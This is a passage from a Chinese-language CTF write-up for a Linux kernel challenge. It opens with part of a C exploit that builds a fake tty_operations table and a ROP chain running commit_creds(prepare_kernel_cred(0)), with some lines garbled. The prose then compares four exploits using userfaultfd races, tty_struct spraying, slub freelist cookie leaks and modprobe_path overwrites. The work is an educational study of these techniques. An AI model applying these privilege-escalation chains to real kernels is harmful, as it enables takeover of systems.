        else
        {
            for (int i = 0;i  two gadget)
        fake_tty_operations->ioctl = base_add(raw_regcache_mark_dirty);
        memset(tty_buf,0,0x200);
        memcpy(tty_buf, fake_tty_operations, sizeof(struct tty_operations));
        write(fd, tty_buf, y);
        *((uint64_t *)(tmp)+0x20/8+3) = base_add(raw_mov_cr4_rdi);  //lock
        *((uint64_t *)(tmp)+0x28/8+3) = xchg_eax_esp; //unlock
        *((uint64_t *)(tmp)+0x30/8+3) = 0x6f0;  //lock_arg ; rdi
        write(fd,tmp,x);
        size_t pop_rdi = base_add(raw_pop_rdi);
        size_t pop_rdx = base_add(raw_pop_rdx);
        size_t mov_rdi_rax = base_add(raw_mov_rdi_rax);
        size_t pop_rsi = base_add(raw_pop_rsi);
        prepare_kernel_cred_addr = base_add(raw_prepare_kernel_cred);
        commit_creds_addr = base_add(raw_commit_creds);
        size_t xor_edi_edi = base_add(0xffffffff8105c0e0);
        //这里swapgs的时候顺便把KPTI关了
        size_t swapgs_restore_regs_and_return_to_usermode =  base_add(0xffffffff81a0095f);
        size_t rop[0x50];
        char* flag_str = "/flag\x00";
        int i=0;
        rop[i++] = pop_rdi;
        rop[i++] = 0;
        rop[i++] = prepare_kernel_cred_addr;
        rop[i++] = pop_rdi;
        rop[i++] = 0;
        rop[i++] = xor_edi_edi;
        rop[i++] = mov_rdi_rax;  
        rop[i++] = 0;
        rop[i++] = commit_creds_addr;
        rop[i++] = swapgs_restore_regs_and_return_to_usermode; 
        rop[i++] = 0;
        rop[i++] = 0;
        rop[i++] = (unsigned long)&win;
        rop[i++] = user_cs;
        rop[i++] = user_rflags;
        rop[i++] = user_sp;
        rop[i++] = user_ss;
        memcpy((void *)(xchg_eax_esp&0xffffffff),rop,sizeof(rop));
        //debug
        printf("vtable addr : %p\n", fake_vtable);
        printf("regcache_mark_dirty addr : %p\n", base_add(raw_regcache_mark_dirty));
        char x_buf[10];
        read(0,x_buf, 10);
        puts("[+] Triggering");
        for (int i = 0;i note = v7`，这个 `v7` 还是最初分配时候的块。而这个块已经在 `uffd_handler` 中被 free 了。这就产生了 UAF。
  2. 之后的过程和 will 的 exp 一样，喷 tty，构造 ROP。
#### exp3
​ 长亭的师傅的 [exp](https://www.chainnews.com/articles/777744778306.htm) 的 UAF
构造和前两种又不一样:
  1. 分配 n 个 `0x400` 大小的块，然后新建 n 个线程通过 `noteedit` 把这 n 个块 free 掉，并一直卡死。
  2. 这样在主线程看来，已经有 n 个 UAF 的块了。对这 n 个块进行 `noteedit` 改小 size 过 check。
  3. 通过 tty_struct 喷射，后面的过程又一模一样了。
#### exp4
​ X1cT34m 的 exp 是这四个里面最简单且最巧妙的。简单在不需要内核 ROP，而是通过 `modprobe_path` 来提权；巧妙在利用了
slub 的控制字节（freelist 单向链表，类似 fastbin）。
  1. 分配两个 0x60 的块，分别为 chunk1, chunk2。
  2. 通过 gift 读出 chunk1 和 chunk2 的地址。
  3. free(chunk2) , free(chunk1)，此时 freelist -> chunk1 -> chunk2
  4. 再次分配 chunk1 和 chunk2，通过 gift 确保和上次分配的是同两个块。
  5. 此时读出 chunk1 的前 8 字节，这 8 字节应为 `cookie ^ chunk1_addr ^ chunk2_addr`（freelist harden , 详见 [Kirin](https://kirin-say.top/2020/03/10/Kernoob-kmalloc-without-SMAP/)）。这样就能泄露出 cookie。
  6. 然后在 `mynote_write` 中利用 `copy_from_user` 形成缺页。
  7. 在 `uffd_handler` 中 free 掉 chunk1。在恢复执行的时候仍然可以向被 free 掉的 chunk1 中写入构造好的内容。此时我们写入 8 字节 `cookie ^ chunk1_addr ^ notebook_addr-0x10` 即可将 freelist 链改为 freelist -> chunk1 -> notebook_addr - 0x10 -> 0。（但此时 freelist 链并不合法）
  8. 由于 name 在 bss 上的位置正好在 notebook 的前面，所以可以将 note_addr - 0x10 的地方写为 `cookie ^ notebook_addr - 0x10 ^ 0`，这样 freelist 链就合法了。
  9. 现在 notebook 可控，就能拿到任意地址读写的权力了。通过 notebook.ko 调用内核函数（计算相对跳转的偏移）的地方泄露内核基地址，然后改写 `modprobe_path` 来提权。
  10. 最后找到一个至今为止尚不明白的点，就是kmalloc和krealloc的行为不一致的问题。将该exp最后申请notebook_addr - 0x10地址的add函数改为edit函数，会发现始终无法从freelist解链取得，但在简单调试后和阅读源码时又没找到差异点。
### 0x03 知识点
​ 因为这是俺第一次复现内核题目，所以记录一下一些知识点和一些方法。
#### userfaultfd
​ 这个在条件竞争中很好用，如果条件竞争的原因是缺页，那么 userfaultfd 可以保证 100% 的竞争成功率。但是要注意的是，
**在`ufffd_handler` 内，没有办法分配回刚刚放入 freelist 的堆块**，正确的姿势是回到主线程再进行分配或者堆喷。
#### tty_struct
​ 这个堆喷技巧挺常用，但是有个坑点是 tty_struct 的 size 并不一定是 0x2e0。正确定位其 size 的做法是在 ida 中解析
vmlinux ，查找字符串 "&tty->legacy_mutex" 的引用。定位到类似 `v2 = (_DWORD
*)sub_FFFFFFFF81236300(qword_FFFFFFFF8288F810, 21004480LL, 0x3A8LL);`
的函数，最后一个参数就是 tty_struct 的大小。（即使 0x2e0 和 0x3a8 都是 0x400 的 slub）
#### ONE gadget to TWO gadget
​ `raw_regcache_mark_dirty` 函数具有非常好的性质，能够劫持两次程序流而且都能控制第一个参数，不过两次 rdi
的值都是一样的。以及第一次 call 的 gadget 需要保证栈平衡返回。
    在本题的内核版本中有设置 rc4 的 gadget。
​ 第二次 call 就可以考虑直接栈迁移进行 ROP 了。由于调用指令是 jmp rax，所以 rax 是确定的，因此需要一个 `xchg
esp,eax; ret` 的 gadget。之后就可以把栈迁移到用户了。
​ 但是注意 KPTI 有个特性是即使关闭了 SMAP 和 SMEP，也只能读写用户空间，不能执行用户空间代码。原因是：
> 不隔离不意味着完全相同，填充内核态页表项时，KPTI 会给页表项加上_PAGE_NX标志，以阻止执行内核态页表所映射用户地址空间的代码。在 KAISER
> patch 里把这一步骤叫 毒化（poison）。
​ 所以还是只能老老实实找内核 gadget，然后打 ROP。
#### work_for_cpu_fn
​ 这个 gadget 可以直接完成提权，这是长亭师傅的方法，及其简单。
    .text:FFFFFFFF81097E90 ; void __fastcall work_for_cpu_fn(work_struct *work)
    .text:FFFFFFFF81097E90 work_for_cpu_fn proc near               ; DATA XREF: .init.data:FFFFFFFF825205D0↓o
    .text:FFFFFFFF81097E90 work = rdi                              ; work_struct *
    .text:FFFFFFFF81097E90                 call    __fentry__      ; PIC mode
    .text:FFFFFFFF81097E95                 push    rbx
    .text:FFFFFFFF81097E96                 mov     rbx, work
    .text:FFFFFFFF81097E99                 mov     work, [work+28h]
    .text:FFFFFFFF81097E9D work = rbx                              ; work_struct *
    .text:FFFFFFFF81097E9D                 mov     rax, [work+20h]
    .text:FFFFFFFF81097EA1                 call    __x86_indirect_thunk_rax ; PIC mode
    .text:FFFFFFFF81097EA6                 mov     [work+30h], rax
    .text:FFFFFFFF81097EAA                 pop     work
    .text:FFFFFFFF81097EAB                 retn
    .text:FFFFFFFF81097EAB work_for_cpu_fn endp
​ 这个函数完成的功能是 `*(size_t *)(rdi + 0x30) = ((size_t (*) (size_t))(rdi +
0x20))(rdi + 0x28)` ，所以只需要调用两次这个函数就能完成 `commit_creds(prepare_kernel_cred(0))`
并且正常返回。
#### Freelist Harden
​ 编译内核的时候 enable 了 `CONFIG_SLAB_FREELIST_HARDENED` 选项后就会有 slab_cookie。没有
cookie 的情况下直接像 fastbin 一样就可以任意地址分配。有了 cookie 需要先泄露 cookie，而且还需要布置想要分配位置的值为
`cookie ^ self_addr ^ point_value`。
对应的内核源码为：
    *
    * Returns freelist pointer (ptr). With hardening, this is obfuscated
    * with an XOR of the address where the pointer is held and a per-cache
    * random number.
    */
    static inline void *freelist_ptr(const struct kmem_cache *s, void *ptr,
        unsigned long ptr_addr)
    {
    #ifdef CONFIG_SLAB_FREELIST_HARDENED
     return (void *)((unsigned long)ptr ^ s->random ^ ptr_addr);
    #else
     return ptr;
    #endif